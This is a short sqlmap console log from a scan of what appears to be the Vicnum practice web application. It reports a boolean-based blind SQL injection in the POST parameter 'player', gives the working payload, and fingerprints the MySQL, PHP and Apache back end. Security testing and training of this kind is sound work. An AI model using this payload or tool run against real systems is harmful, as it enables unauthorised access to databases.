
    sqlmap/1.0-dev-278c562 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:07:48

[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[20:07:48] [INFO] resuming back-end DBMS 'mysql' 
[20:07:48] [INFO] testing connection to the target URL
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: POST
Parameter: player
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: player=-7104' OR (6950=6950) AND 'ERFR'='ERFR
---
[20:07:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache, PHP 5.3.10
back-end DBMS: MySQL 5
[20:07:48] [INFO] fetched data logged to text files under '/home/romulo/websec/sqlmap/output/vicnum.ciphertechs.com'

[*] shutting down at 20:07:48

